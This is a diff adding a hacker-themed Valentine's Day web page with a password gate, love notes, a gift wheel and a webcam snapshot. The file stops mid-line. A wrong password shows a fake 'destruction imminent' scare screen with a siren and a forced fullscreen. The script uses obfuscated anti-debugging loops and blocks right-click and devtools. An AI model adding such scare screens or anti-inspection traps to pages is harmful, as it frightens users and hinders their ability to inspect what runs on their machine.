@@ -1,0 +1,783 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Valentine: Operation Love 2026</title>
+    
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Dancing+Script:wght@700&family=Orbitron:wght@500;900&family=Share+Tech+Mono&family=Poppins:wght@300;500&display=swap" rel="stylesheet">
+
+    <style>
+        body { margin: 0; overflow-x: hidden; background-color: #000; color: white; font-family: 'Poppins', sans-serif; }
+        .font-script { font-family: 'Dancing Script', cursive; }
+        .font-hacker { font-family: 'Orbitron', sans-serif; }
+        .font-mono-hack { font-family: 'Share Tech Mono', monospace; }
+
+        .reveal-section {
+            opacity: 0; transform: translateY(40px); filter: blur(8px);
+            transition: all 1.2s ease-out;
+        }
+
+        .glass {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
+            border-radius: 1rem;
+        }
+
+        .scanlines {
+            background: linear-gradient(
+                to bottom,
+                rgba(255,255,255,0),
+                rgba(255,255,255,0) 50%,
+                rgba(0,0,0,0.2) 50%,
+                rgba(0,0,0,0.2)
+            );
+            background-size: 100% 4px;
+            position: fixed; inset: 0; pointer-events: none; z-index: 100;
+        }
+        .glitch-text {
+            position: relative;
+            animation: glitch-skew 1s cubic-bezier(0.25, 0.46, 0.45, 0.94) both infinite;
+        }
+        @keyframes glitch-skew {
+            0% { transform: skew(0deg); }
+            20% { transform: skew(-2deg); }
+            40% { transform: skew(2deg); }
+            60% { transform: skew(-1deg); }
+            80% { transform: skew(1deg); }
+            100% { transform: skew(0deg); }
+        }
+
+        .wheel-container { position: relative; width: 300px; height: 300px; margin: 0 auto; border-radius: 50%; border: 4px solid #fff; box-shadow: 0 0 30px #ff0055; overflow: hidden; }
+        .wheel { width: 100%; height: 100%; background: conic-gradient(#ff99aa 0% 12.5%, #ff6688 12.5% 25%, #ff3366 25% 37.5%, #acd7ab 37.5% 50%, #675a9b 50% 62.5%, #a560c0 62.5% 75%, #332a35 75% 87.5%, #72732f 87.5% 100%); border-radius: 50%; }
+        .arrow { position: absolute; top: -15px; left: 50%; transform: translateX(-50%); width: 0; height: 0; border-left: 15px solid transparent; border-right: 15px solid transparent; border-top: 30px solid white; z-index: 20; }
+
+        @keyframes heartbeat { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
+        .animate-heartbeat { animation: heartbeat 1.5s infinite; }
+        .slide-up { animation: slideUp 1s forwards; opacity: 0; transform: translateY(50px); }
+        @keyframes slideUp { to { opacity: 1; transform: translateY(0); } }
+
+        .scanner-bar { width: 100%; height: 2px; background: #00f3ff; box-shadow: 0 0 2px #00f3ff; animation: scan-v 2s infinite; }
+        @keyframes scan-v { 0%,100% { transform: translateY(-80px); opacity: 0;} 50% { transform: translateY(420px); opacity: 1; } }
+       
+
+        
+        #matrix-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; }
+        
+        .destroy-anim { animation: destroy 1s forwards ease-in; }
+        @keyframes destroy {
+            0% { transform: scale(1); opacity: 1; filter: blur(0); }
+            100% { transform: scale(0) rotate(180deg); opacity: 0; filter: blur(20px); }
+        }
+
+
+        .trail { position: absolute; width: 6px; height: 6px; background: #ff0055; border-radius: 50%; pointer-events: none; transition: opacity 0.5s; z-index: 9999; }
+    </style>
+</head>
+<body class="antialiased selection:bg-pink-500 selection:text-white">
+
+    <audio id="bg-music" loop>
+        <source src="https://cdn.pixabay.com/download/audio/2022/10/14/audio_9939f792cb.mp3" type="audio/mpeg">
+    </audio>
+    <audio id="siren-sound" loop>
+    <source src="https://www.soundjay.com/misc/sounds/siren-alert-1.mp3" type="audio/mpeg"></audio>
+
+    <div id="hack-overlay" class="hidden fixed inset-0 bg-black z-[100] flex-col items-center justify-center font-mono-hack overflow-hidden">
+        <div class="scanlines"></div>
+        <div class="absolute inset-0 bg-[url('https://giffiles.alphacoders.com/119/119822.gif')] opacity-20 bg-cover mix-blend-screen"></div>
+        <div class="absolute inset-1 relative-5 bg-[url('https://media3.giphy.com/media/v1.Y2lkPTc5MGI3NjExanNjZXpqcmsxaGsyNHpoZXNrMHgxeHFlZHVidXhtc3FpYXMzbHNjbSZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/C4NdKtRaQE9m8/giphy.gif')] opacity-40 bg-cover mix-blend-screen"></div>
+
+        
+        <div class="z-50 text-center relative p-10 ">
+            
+            <h1 class="text-6xl text-red-600 font-black animate-pulse glitch-text">SYSTEM FAILURE</h1>
+            <div class="relative my-10"><span id="destroy-percent" class="text-[120px] font-bold text-red-600 font-mono-hack">0%</span></div>
+            <p class="text-red-400 text-xl blinking">UNAUTHORIZED ACCESS DETECTED</p>
+            <p class="text-gray-400 mt-4">DESTRUCTION IMMINENT: <span id="countdown-timer">30</span>s</p>
+
+            <div class="mt-8 text-xs text-red-800 text-left w-full overflow-hidden whitespace-nowrap">
+                ERROR: 0x0002938 // KERNEL PANIC // MEMORY DUMP // C:\USER\OPERATINGSYSTEM\DELETE
+            </div>
+            
+        </div>
+    </div>
+
+    <section id="page-login" class="fixed inset-0 z-50 flex items-center justify-center bg-black">
+        <canvas id="matrix-canvas"></canvas> <div class="glass p-10 max-w-sm w-full text-center space-y-8 relative overflow-hidden backdrop-blur-md z-10 border-cyan-500/30 shadow-[0_0_50px_rgba(0,255,255,0.1)]">
+             
+            <div class="absolute top-0 left-0 w-full scanner-bar"></div>
+            <div class="absolute top-0 left-0 w-full scanner-bar1"></div>
+             
+            
+            <h2 class="text-3xl text-cyan-400 font-hacker tracking-widest drop-shadow-md">SECURE GATEWAY</h2>
+            <p class="text-cyan-800 text-xs font-mono-hack">ENCRYPTION: AES-256 // LAYER 4</p>
+            
+            <input type="password" id="pass-input" placeholder="ACCESS CODE " 
+                class="w-full bg-black/40 border-b-2 border-cyan-500/50 p-4 text-center text-cyan-50 text-2xl font-hacker focus:outline-none focus:border-cyan-400 placeholder-cyan-900 transition-all">
+            
+            <button onclick="checkPass()" 
+                class="w-full bg-cyan-900/20 border border-cyan-500 text-cyan-400 py-4 rounded font-bold tracking-widest hover:bg-cyan-500 hover:text-black transition-all duration-300 shadow-[0_0_15px_rgba(0,255,255,0.2)]">
+                AUTHENTICATE
+            </button>
+        </div>
+    </section>
+
+    <div id="loader" class="hidden fixed inset-1  z-[60] flex flex-col items-center justify-center text-center">
+                 <div class="absolute inset-1 bg-[url('https://media1.giphy.com/media/v1.Y2lkPTc5MGI3NjExbTA0OWQ5MnpsbmdxM3FrMnhuM3A2ejBmZG10dHVoMHBodjYzMWo4aCZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/10l8fc00NMNJNm/giphy.gif')] opacity-40 bg-cover mix-blend-screen"></div>
+
+        <div class="relative z-10">
+            <div class="text-7xl text-red-500 animate-pulse mb-6">⚠️</div>
+            <h2 class="text-3xl text-red-500 font-mono-hack mb-4 glitch-text">INJECTING LOVE PROTOCOL...</h2>
+            <div class="w-80 h-4 bg-gray-900 border border-red-900 rounded-full overflow-hidden mb-4">
+                <div id="progress-bar" class="h-full bg-red-600 w-0 transition-all duration-[3000ms] ease-linear shadow-[0_0_20px_red]"></div>
+            </div>
+
+           
+            <div class="text-red-900 font-mono text-xs mt-2">
+                > BYPASSING FIREWALL...<br>
+                > UPLOADING FEELINGS.EXE...<br>
+                > ACCESS GRANTED.
+            </div>
+        </div>
+    </div>
+
+    <main id="app" class="hidden relative min-h-screen">
+        
+        <canvas id="bg-canvas" class="fixed inset-0 z-[-1]"></canvas>
+        <div class="fixed inset-0 bg-gradient-to-b from-black/70 via-transparent to-black/90 pointer-events-none z-0"></div>
+
+        <section class="h-screen flex flex-col items-center justify-center text-center px-4 relative">
+            <div class="slide-up">
+                <h2 class="text-xl md:text-3xl font-script text-pink-300 mb-4">Welcome to your space...</h2>
+                <h1 class="text-5xl md:text-8xl font-bold bg-clip-text text-transparent bg-gradient-to-r from-pink-500 via-red-500 to-purple-500 filter drop-shadow-[0_0_10px_rgba(236,72,153,0.5)]">
+                   Happy Valentine Day
+                </h1>
+                <p class="mt-6 text-gray-300 max-w-lg mx-auto leading-relaxed opacity-80">
+                    A digital universe created just for you. Scroll down to unlock your surprise.
+                </p>
+            </div>
+            <div class="absolute bottom-10 animate-bounce text-pink-500 text-2xl">Scroll Down ↓</div>
+        </section>
+
+        <section class="min-h-screen flex items-center justify-center py-20 px-4">
+            <div class="glass max-w-3xl w-full p-10 relative overflow-hidden">
+                <div class="absolute top-0 left-0 w-full h-2 bg-gradient-to-r from-pink-500 to-purple-500"></div>
+                <h2 class="text-3xl font-hacker mb-8 text-center">Identity Confirmation</h2>
+                <div class="space-y-6 text-center">
+                    <p class="text-5xl font-script mb-10 text-pink-300 animate-pulse mb-6">Who is the queen of my heart 💕👸 ? </p>
+                    <input type="text" id="name-input" placeholder="Your Name..." oninput="updateName(this.value)"
+                        class="bg-transparent border-b-2 border-pink-500 text-center text-2xl w-3/4 focus:outline-none text-white pb-2">
+                    <div class="mt-8 p-6 bg-gradient-to-br from-pink-900/50 to-purple-900/50 rounded-xl border border-pink-500/30 transform transition hover:scale-105 duration-300">
+                        <h3 class="text-4xl font-script text-pink-300">Hello, <span class="user-name">Love</span></h3>
+                        <p class="mt-2 text-sm text-gray-400">Date: Feb 14, 2026</p>
+                        <p class="mt-4 italic">"Every love story is beautiful, but ours is my favorite."</p>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <section class="py-20 px-4 max-w-6xl mx-auto grid grid-cols-1 md:grid-cols-2 gap-8">
+            <div class="glass p-8 rounded-2xl text-center hover:bg-white/5 transition">
+                <div class="text-4xl mb-4">💌</div>
+                <h3 class="text-xl font-bold mb-2">Sweet Love Note</h3>
+                <p id="love-note-display" class="min-h-[60px] text-gray-300 italic text-sm">Tap the button...</p>
+                <button onclick="generateNote()" class="mt-4 px-6 py-2 bg-pink-600 rounded-full hover:bg-pink-500 transition shadow-lg">Generate</button>
+            </div>
+
+            <div class="glass p-8 rounded-2xl text-center hover:bg-white/5 transition">
+                <div class="text-4xl mb-4">✨</div>
+                <h3 class="text-xl font-bold mb-2">Why You?</h3>
+                <p id="compliment-display" class="min-h-[60px] text-gray-300 italic text-sm">Find out why...</p>
+                <button onclick="generateCompliment()" class="mt-4 px-6 py-2 bg-purple-600 rounded-full hover:bg-purple-500 transition shadow-lg">Tell Me</button>
+            </div>
+        </section>
+
+        <section id="proposal-section" class="min-h-screen flex flex-col items-center justify-center relative overflow-hidden">
+            <h2 class="text-5xl md:text-7xl font-script text-center mb-16 text-pink-400 drop-shadow-xl animate-pulse">
+                Will you be my Valentine?
+            </h2>
+            
+            <div class="flex flex-wrap justify-center gap-10 z-10 relative w-full h-40">
+                <button onclick="handleYes()" 
+                    class="group relative px-12 py-5 bg-green-500 rounded-full text-2xl font-bold shadow-[0_0_30px_rgba(34,197,94,0.5)] hover:shadow-[0_0_50px_rgba(34,197,94,0.8)] transition-all transform hover:-translate-y-2 z-20">
+                    <span class="mr-2">YES! 💖</span>
+                    <span class="absolute inset-0 rounded-full border-2 border-white opacity-0 group-hover:animate-ping"></span>
+                </button>
+                
+                <button id="no-btn" onmouseover="moveNo()" onclick="moveNo()"
+                    class="px-12 py-5  rounded-full text-2xl font-bold text-gray-400 transition-all absolute z-20 border border-gray-500">
+                    NO 
+
+                </button>
+            </div>
+        </section>
+
+        <section id="celebration-section" class="hidden min-h-screen py-20 px-4 slide-up">
+             <div class="w-full max-w-2xl mx-auto flex flex-col items-center">
+                
+                <h1 class="text-5xl text-yellow-400 font-script mb-10 animate-bounce text-center">I can’t stop smiling right now. Thank you for being my Valentine — you really made my heart melt 🥺❤️</h1>
+
+                <div class="glass w-full p-8 mb-10 text-center relative">
+                    <h3 class="text-2xl font-bold mb-6 text-pink-300"> Spin for Your Valentine Gift 🎁</h3>
+                    <div class="wheel-container"><div class="arrow"></div><div id="wheel" class="wheel"></div></div>
+                    <button onclick="spinWheel()" id="spin-btn" class="mt-8 px-10 py-3 bg-gradient-to-r from-yellow-500 to-orange-500 text-black font-bold text-xl rounded-full shadow-lg hover:scale-105 transition">SPIN NOW 🎰</button>
+                    <div id="claim-bubble" class="hidden mt-6"><a id="claim-link" href="#" target="_blank" class="inline-block px-8 py-4 bg-gradient-to-r from-red-600 to-pink-600 rounded-full font-bold text-white shadow-lg border border-white">OPEN GIFT 🎁</a></div>
+                </div>
+
+                <div class="glass w-full p-8 mb-10 text-center">
+                    <h3 class="text-xl font-bold mb-4">📸 Create Memory</h3>
+                    <video id="webcam" class="w-full h-64 bg-black rounded-lg mb-4 object-cover border border-gray-700" autoplay muted></video>
+                    <canvas id="photo-canvas" class="hidden"></canvas>
+                    <div class="flex justify-center gap-4">
+                        <button onclick="startCamera()" class="bg-blue-600 px-6 py-2 rounded-lg hover:bg-blue-500 font-bold">Start Cam</button>
+                        <button onclick="takePhoto()" class="bg-pink-600 px-6 py-2 rounded-lg hover:bg-pink-500 font-bold">Save Photo ⬇️</button>
+                    </div>
+                </div>
+                
+
+                <div class="glass-clean p-8 mb-20 text-center relative overflow-hidden">
+    <h3 class="text-xl font-bold mb-4 font-cyber text-cyan-400 tracking-widest">📡 SECURE DATA UPLINK</h3>
+    
+                    <div id="terminal-console" class="bg-black/60 p-4 rounded-lg mb-4 text-left font-hacker text-[10px] text-green-500 h-24 overflow-y-auto border border-green-500/20 shadow-inner">
+                        <div>[SYSTEM]: Awaiting Packet Injection...</div>
+                        <div id="terminal-log"></div>
+                    </div>
+                    
+                    <textarea id="secure-note" placeholder="Enter message to encrypt and transmit..." 
+                        class="w-full h-32 bg-transparent border border-cyan-500/30 rounded-lg p-4 font-hacker text-cyan-400 focus:border-cyan-400 focus:outline-none transition-all placeholder-cyan-900"></textarea>
+                    
+                    <button onclick="transmitToWebhook()" id="transmit-btn" class="w-full mt-4 bg-cyan-900/20 border border-cyan-500 text-cyan-400 py-3 rounded-lg font-cyber hover:bg-cyan-500 hover:text-black transition-all shadow-[0_0_15px_rgba(0,243,255,0.2)] uppercase">
+                        Execute Transmission 🚀
+                    </button>
+                </div>
+
+            </div>
+        </section>
+
+    </main>
+
+    <script>
+
+        
+       
+        const virus = "025ac3ddef52e0aaa62896954c6fe57948a7c144cb203610499a912b832fd473";
+
+
+                    async function sha256(message) {
+                    const msgBuffer = new TextEncoder().encode(message);
+                    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+                    const hashArray = Array.from(new Uint8Array(hashBuffer));
+                    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+                }
+        const GIFT_LINKS = [
+             "https://freshknots.in/wp-content/uploads/2025/06/Hamper5-540x540.jpg",
+            "https://freshknots.in/wp-content/uploads/2025/03/Untitled-design-1-540x540.jpg",
+            "https://www.boxupgifting.com/cdn/shop/files/Valentineshampers1-7dayhamper-1_800x.jpg",
+            "https://img.udelf.com/l/valentines_day_gift_oyster_necklace_real_pearl_necklace_wooden_gift_box_113455_117608.webp"
+        ];
+        
+        let matrixInterval;
+        let isExploitMode = false;
+
+    
+        
+        
+        
+
+        function initMatrixEffect() {
+            const canvas = document.getElementById('matrix-canvas');
+            const ctx = canvas.getContext('2d');
+            
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+            
+            const katakana = 'アァカサタナハマヤャラワガザダバパイィキシチニヒミリヂビピウゥクスツヌフムユュルグズブヅプエェケセテネヘメレゲゼデベペオォコソトノホモヨョロヲゴゾドボポ1234567890';
+            const latin = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
+            const nums = '0123456789';
+            const alphabet = katakana + latin + nums;
+           
+            const fontSize = 16;
+            const columns = canvas.width/fontSize;
+            
+            const rainDrops = [];
+            for( let x = 0; x < columns; x++ ) {
+                rainDrops[x] = 1;
+            }
+
+            const draw = () => {
+                ctx.fillStyle = isExploitMode ? 'rgba(20, 0, 0, 0.1)' : 'rgba(0, 0, 0, 0.05)'; 
+                ctx.fillRect(0, 0, canvas.width, canvas.height);
+                
+                ctx.fillStyle = isExploitMode ? '#ff0000' : '#0F0'; 
+                ctx.font = fontSize + 'px monospace';
+            
+                for(let i = 0; i < rainDrops.length; i++) {
+                    const text = alphabet.charAt(Math.floor(Math.random() * alphabet.length));
+                    ctx.fillText(text, i*fontSize, rainDrops[i]*fontSize);
+                    
+                    if(rainDrops[i]*fontSize > canvas.height && Math.random() > 0.975){
+                        rainDrops[i] = 0;
+                    }
+                    rainDrops[i]++;
+                }
+            };
+            
+
+            let speed = isExploitMode ? 10 : 30;
+            if(matrixInterval) clearInterval(matrixInterval);
+            matrixInterval = setInterval(draw, speed);
+        }
+        
+
+        window.addEventListener('resize', () => initMatrixEffect());
+        initMatrixEffect(); 
+        let scene, camera, renderer, activeMesh, animationId;
+
+    
+                async function checkPass() {
+            const input = document.getElementById('pass-input').value;
+            const inputHash = await sha256(input);
+
+            if (inputHash === virus) {
+       
+
+                document.getElementById('page-login').classList.add('hidden'); 
+                document.getElementById('matrix-canvas').style.zIndex = "55"; 
+                
+                isExploitMode = true;
+                initMatrixEffect();
+
+                const loader = document.getElementById('loader');
+                loader.classList.remove('hidden');
+                loader.classList.add('flex');
+                
+                const audio = document.getElementById('bg-music');
+                audio.volume = 0.5;
+                audio.play().catch(e => console.log("Audio blocked"));
+
+                setTimeout(() => { document.getElementById('progress-bar').style.width = '100%'; }, 100);
+
+                setTimeout(() => {
+                    clearInterval(matrixInterval); 
+                    document.getElementById('matrix-canvas').classList.add('hidden');
+                    loader.classList.add('hidden');
+                    loader.classList.remove('flex');
+                    document.getElementById('app').classList.remove('hidden');
+                    initStarfield(); 
+                }, 3500);
+
+            } else {
+                startHackerMode();
+            }
+        }
+                    (function() {
+                setInterval(function() {
+                    debugger;
+                }, 100); 
+            })();
+
+      
+
+(function() {
+    setInterval(function() {
+        (function() {
+            return false;
+        }['constructor']('debugger')['call']('action'));
+    }, 50); 
+})();
+
+(function() {
+    var _0xde = function() {
+        var _0x1a = true;
+        return function(_0x2b, _0x3c) {
+            var _0x4d = _0x1a ? function() {
+                if (_0x3c) {
+                    var _0x5e = _0x3c.apply(_0x2b, arguments);
+                    _0x3c = null;
+                    return _0x5e;
+                }
+            } : function() {};
+            _0x1a = false;
+            return _0x4d;
+        };
+    }();
+
+const checkStatus = () => {
+    const start = Date.now();
+    debugger; 
+    const end = Date.now();
+    
+    if (end - start > 100) {
+        document.body.innerHTML = "<h1>ACCESS DENIED: SECURITY BREACH 🚨</h1>";
+        window.location.href = "about:blank";
+    }
+};
+
+setInterval(checkStatus, 1000);
+    
+    setInterval(function() {
+        (function() {
+            return false;
+        }['constructor']('debugger')['call']('action'));
+    }, 100);
+})();
+
+        function startHackerMode() {
+            document.getElementById('siren-sound').play().catch(error => console.log("Audio Error:", error));
+            const overlay = document.getElementById('hack-overlay');
+            overlay.classList.remove('hidden');
+            overlay.classList.add('flex');
+            
+            if(document.documentElement.requestFullscreen) document.documentElement.requestFullscreen();
+            
+            let percentage = 0;
+            const start = Date.now();
+            const interval = setInterval(() => {
+                const elapsed = Date.now() - start;
+                percentage = Math.floor((elapsed / 30000) * 100); 
+                
+                if(percentage >= 100) {
+                    clearInterval(interval);
+                    alert("PRANK! Try again.");
+                    window.location.reload();
+                }
+                
+                document.getElementById('destroy-percent').innerText = percentage + "%";
+                document.getElementById('countdown-timer').innerText = 30 - Math.floor(elapsed/1000);
+            }, 100);
+        }
+
+        function initStarfield() {
+            const scene = new THREE.Scene();
+            const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+            const renderer = new THREE.WebGLRenderer({ canvas: document.getElementById('bg-canvas'), alpha: true });
+            renderer.setSize(window.innerWidth, window.innerHeight);
+
+            const particlesGeometry = new THREE.BufferGeometry();
+            const count = 700;
+            const posArray = new Float32Array(count * 3);
+            for(let i = 0; i < count * 3; i++) posArray[i] = (Math.random() - 0.5) * 20;
+
+            particlesGeometry.setAttribute('position', new THREE.BufferAttribute(posArray, 3));
+            const material = new THREE.PointsMaterial({ size: 0.05, color: 0xff0055, transparent: true, opacity: 0.8 });
+            const particlesMesh = new THREE.Points(particlesGeometry, material);
+            scene.add(particlesMesh);
+            camera.position.z = 5;
+
+            function animate() {
+                requestAnimationFrame(animate);
+                particlesMesh.rotation.y += 0.001;
+                particlesMesh.rotation.x += 0.001;
+                renderer.render(scene, camera);
+            }
+            animate();
+        }
+
+        function updateName(name) { document.querySelector('.user-name').innerText = name || "Love"; }
+        
+        const notes = [
+    "You are the CSS to my HTML.",
+    "My love for you is an infinite loop.",
+    "You make my heart skip a beat.",
+    "I love you more than coffee.",
+    "You are the semi-colon to my code; without you, I'm a mess.",
+    "Are you a keyboard? Because you are just my type.",
+    "You auto-complete me.",
+    "My love for you compiles without errors.",
+    "You are my favorite notification.",
+    "404 Error: Life not found without you.",
+    "You are the source code of my happiness.",
+    "I'd pause my game for you.",
+    "You are high priority in my task manager.",
+    "My heart has zero latency when I'm with you.",
+    "You are the only bug I want to keep.",
+    "Our connection is stronger than 5G.",
+    "You have root access to my heart.",
+    "You are my home page.",
+    "I love you more than free Wi-Fi.",
+    "You turn my software into hardware.",
+    "You are the Apple of my eye (or Android, I don't judge).",
+    "My world revolves around you like a `while(true)` loop.",
+    "You are the reason I wake up every morning.",
+    "I promise to never `git push --force` your heart.",
+    "You are 100% my type.",
+    "My love for you is constant, not a variable.",
+    "You light up my world like Dark Mode on an OLED screen.",
+    "I love you to the moon and back.",
+    "You are the missing pixel in my picture.",
+    "You make me feel like I’m running on SSD speed.",
+    "There is no `Ctrl+Z` on my love for you.",
+    "You are sweeter than syntax sugar.",
+    "I am `await`ing you forever.",
+    "You are the only user authorized in my heart.",
+    "I’d delete my search history for you.",
+    "You’re cleaner than my browser history.",
+    "You have the prettiest smile I've ever seen.",
+    "Being with you is like a successful deployment.",
+    "You make my dopamine levels overflow.",
+    "I love you more than I love closing 100 tabs.",
+    "You are my favorite Hello World.",
+    "You define the meaning of 'Quality Assurance'.",
+    "My heart beats in binary: 010101 (I Love U).",
+    "You are the CSS to my messy HTML.",
+    "I'd share my Netflix password with you.",
+    "You are my safe space.",
+    "You make reality better than my dreams.",
+    "I want to `sudo apt-get install` a life with you.",
+    "You’re hotter than my laptop running a 4K render.",
+    "My love for you is open source (but exclusive to you).",
+    "You are the API to my happiness.",
+    "You are my favorite algorithm.",
+    "If love was a function, you’d be the return value.",
+    "You perform better than my best code.",
+    "You are my backup drive; you keep me safe.",
+    "I will never `disconnect` from you.",
+    "You are the logic to my chaos.",
+    "Every moment with you is a feature, not a bug.",
+    "You make my heart race faster than a CPU overload.",
+    "I love you a whole gigabyte.",
+    "You are my cloud storage; you hold all my memories.",
+    "You are the upgrade I've been waiting for.",
+    "My love for you is encrypted and secure.",
+    "You are the framework of my life.",
+    "I can't `escape` your love.",
+    "You are the most beautiful line of code.",
+    "You are my partner in code and in life.",
+    "I love you more than pizza (and that's a lot).",
+    "You are my lucky charm.",
+    "You make everything make sense.",
+    "You are the best decision I ever made.",
+    "I'm stuck on you like a `sticky` position in CSS.",
+    "You make my heart float like `float: left`.",
+    "You have full permissions to my heart.",
+    "I'd never `block` you.",
+    "You are my favorite song on repeat.",
+    "You are the `main()` function of my life.",
+    "I love you 3000.",
+    "You are my player 2.",
+    "You make my life high resolution.",
+    "You are the enter key to my heart.",
+    "I want to `commit` to you forever.",
+    "You make me happier than a fixed bug.",
+    "You are my serendipity.",
+    "I love you endlessly.",
+    "You are the cache to my memory.",
+    "You are prettier than a well-formatted JSON.",
+    "My love for you has no bugs.",
+    "You are the admin of my heart.",
+    "You make my world colorful.",
+    "I love you more than Stack Overflow.",
+    "You are my favorite variable.",
+    "You are the password to my happiness.",
+    "I am programmed to love you.",
+    "You are my exception handler.",
+    "I will always support you like a good library.",
+    "You are my standard output.",
+    "You make my heart buffer.",
+    "I love you more than I hate Internet Explorer.",
+    "You are my forever."
+    ];
+
+
+        const compliments = [
+    "Your smile lights up the room.",
+    "You are smarter than Google.",
+    "You have the best taste.",
+    "Your kindness is contagious.",
+    "You make the world a better place just by being in it.",
+    "You look stunning today (and every day).",
+    "Your laugh is my favorite sound.",
+    "You have a heart of gold.",
+    "You are incredibly thoughtful.",
+    "You are a natural problem solver.",
+    "Your potential is limitless.",
+    "You glow differently.",
+    "You are beautiful inside and out.",
+    "You are my favorite person to talk to.",
+    "You have the best sense of humor.",
+    "You make smart look sexy.",
+    "Your energy is magnetic.",
+    "You inspire me to be better.",
+    "You are fearlessly you.",
+    "You have a beautiful mind.",
+    "You are so easy to love.",
+    "You handle challenges with such grace.",
+    "You are a masterpiece.",
+    "Your hugs are the best therapy.",
+    "You are stronger than you think.",
+    "You have impeccable style.",
+    "You are a limited edition.",
+    "You bring out the best in everyone.",
+    "You are simply unforgettable.",
+    "You have a contagious enthusiasm.",
+    "You are cooler than a liquid nitrogen cooling system.",
+    "You radiate positivity.",
+    "You are more reliable than a 99.9% uptime server.",
+    "You are a genius.",
+    "You have the prettiest eyes.",
+    "You are worth more than Bitcoin.",
+    "You are pure magic.",
+    "You are incredibly talented.",
+    "You are a total catch.",
+    "You make hard things look easy.",
+    "You are a ray of sunshine.",
+    "You have a great perspective on life.",
+    "You are gentle yet strong.",
+    "You are the definition of perfection.",
+    "You are sweeter than honey.",
+    "You are my favorite view.",
+    "You are incredibly patient.",
+    "You are so down to earth.",
+    "You are a true gem.",
+    "You have the courage of a lion.",
+    "You are mesmerizing.",
+    "You are the best listener.",
+    "You make boring things fun.",
+    "You are prettier than a well-designed UI.",
+    "You have a great vibe.",
+    "You are so creative.",
+    "You are remarkably observant.",
+    "You are helpful and kind.",
+    "You are a breath of fresh air.",
+    "You are dazzling.",
+    "You have the best ideas.",
+    "You are so understanding.",
+    "You are a good friend/partner.",
+    "You are irreplaceable.",
+    "You are lovely.",
+    "You have a great work ethic.",
+    "You are a visionary.",
+    "You are astonishing.",
+    "You are vibrant.",
+    "You are full of surprises.",
+    "You are delightful.",
+    "You are so genuine.",
+    "You are charming.",
+    "You are warm and welcoming.",
+    "You are absolutely wonderful.",
+    "You are efficient and effective.",
+    "You have a great soul.",
+    "You are captivating.",
+    "You are so passionately you.",
+    "You are an angel.",
+    "You are brilliant.",
+    "You have a soothing presence.",
+    "You are the highlight of my day.",
+    "You are amazing at what you do.",
+    "You have excellent taste in movies/music.",
+    "You are a star.",
+    "You are trustworthy.",
+    "You are brave.",
+    "You are affectionate.",
+    "You are divine.",
+    "You are extraordinary.",
+    "You are so well-spoken.",
+    "You are a blessing.",
+    "You look like a dream.",
+    "You are incredibly sharp.",
+    "You are fun to be around.",
+    "You are a joy to know.",
+    "You are perfection in my eyes.",
+    "You are simply the best.",
+    "You are enough, just as you are."
+];
+
+      
+        function generateNote() { document.getElementById('love-note-display').innerText = notes[Math.floor(Math.random() * notes.length)]; }
+        function generateCompliment() { document.getElementById('compliment-display').innerText = compliments[Math.floor(Math.random() * compliments.length)]; }
+
+        function moveNo() {
+            const btn = document.getElementById('no-btn');
+            const x = Math.random() * (window.innerWidth - 200);
+            const y = Math.random() * (window.innerHeight - 100);
+            btn.style.position = 'fixed';
+            btn.style.left = `${x}px`;
+            btn.style.top = `${y}px`;
+        }
+
+        function handleYes() {
+            const noBtn = document.getElementById('no-btn');
+            noBtn.classList.add('destroy-anim');
+            setTimeout(() => noBtn.remove(), 500);
+
+            confetti({ particleCount: 200, spread: 100, origin: { y: 0.6 } });
+
+            const celebration = document.getElementById('celebration-section');
+            celebration.classList.remove('hidden');
+            
+            setTimeout(() => {
+                celebration.scrollIntoView({ behavior: 'smooth' });
+            }, 800);
+        }
+
+        function spinWheel() {
+            const wheel = document.getElementById('wheel');
+            const btn = document.getElementById('spin-btn');
+            wheel.style.transition = 'none'; wheel.style.transform = 'rotate(0deg)';
+            btn.disabled = true; btn.innerText = "SPINNING...";
+            document.getElementById('claim-bubble').classList.add('hidden');
+
+            void wheel.offsetWidth;
+            const totalDeg = 7200 + Math.floor(Math.random() * 360); 
+            wheel.style.transition = 'transform 8s cubic-bezier(0.1, 0.7, 0.1, 1)'; 
+            wheel.style.transform = `rotate(${totalDeg}deg)`;
+
+            setTimeout(() => {
+                const degrees = totalDeg % 360;
+                const segmentIndex = Math.floor(((360 - degrees) % 360) / 45); 
+                document.getElementById('claim-link').href = GIFT_LINKS[segmentIndex % GIFT_LINKS.length];
+                document.getElementById('claim-bubble').classList.remove('hidden');
+                confetti({ particleCount: 100, spread: 60 });
+                btn.disabled = false; btn.innerText = "SPIN AGAIN 🎰";
+            }, 8000);
+        }
+
+        function startCamera() {
+            navigator.mediaDevices.getUserMedia({ video: true })
+            .then(s => document.getElementById('webcam').srcObject = s)
+            .catch(e => alert("Camera Permission Denied"));
+        }
+        function takePhoto() {
+            const v = document.getElementById('webcam');
+            const c = document.getElementById('photo-canvas');
+            c.width = v.videoWidth; c.height = v.videoHeight;
+            c.getContext('2d').drawImage(v,0,0);
+            const a = document.createElement('a');
+            a.download = 'love-memory.png';
+            a.href = c.toDataURL();
+            a.click();
+        }
+        document.addEventListener('DOMContentLoaded', () => {
+});
+                document.addEventListener('contextmenu', event => event.preventDefault());
+
+                document.onkeydown = function(e) {
+                    if(e.keyCode == 123 || 
